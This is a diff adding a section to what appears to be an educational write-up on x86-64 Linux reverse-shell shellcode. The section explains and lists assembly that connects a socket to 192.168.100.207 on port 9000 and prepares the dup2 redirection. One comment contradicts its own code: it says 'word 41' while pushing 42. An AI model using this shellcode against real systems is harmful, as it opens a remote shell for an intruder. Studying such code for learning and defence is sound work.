@@ -105,3 +105,48 @@ socket:
 
        mov rbx, rax           ; The value of RAX is saved on RBX. Such value will later on be used for sockfd arguments.
 ```
+
+##### Connect
+
+manpage arguments: ```int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);```
+
++ RBP stores value "192.168.100.207" in reverse and hex as well.
++ RAX obtains the syscall value.
++ RDI satisfies the sockfd argument, by copying the value in RBX.
++ 0 is pushed through RDX.
++ The value in RBP is pushed.
++ "9000" is pushed within the hex format.
++ "AF_INET" is pushed within the hex format.
++ The value of RSP is copied into RSI.
++ DL is given a length of 50.
++ The syscall is executed.
++ RSI is zeroed out.
++ RSI is given a value of 3, as the following function is dup2
+
+```term
+connect:
+
+       mov rbp, 0xcf64a8c0    ; Saves "192.168.100.207" in hex and reverse order, storing it in RBP
+
+       push word 42           ; Pushes word 41 (connect) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+
+       mov rdi, rbx           ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall.
+
+       push rdx               ; Pushes 0
+
+       push rbp               ; Pushes the value of RBP into the Stack.
+       push word 0x2823       ; Pushes the word 9000 into the stack.
+       push word 0x02         ; Pushes AF_INET into the stack.
+
+       mov rsi, rsp           ; Copies the value of RSP into RSI.
+
+       mov dl, 50             ; This argument requires the length of the struct, anything above 16 should work.
+       syscall                ; The syscall is executed.
+
+       xor rsi, rsi           ; Zeroes out RSI
+
+       inc rsi                ; Increments RSI.
+       inc rsi                ; Increments RSI.
+       inc rsi                ; Increments RSI. This will work as a counter, for the dup2 syscall, by incrementing RSI by three times NULLs are prvented.
+```
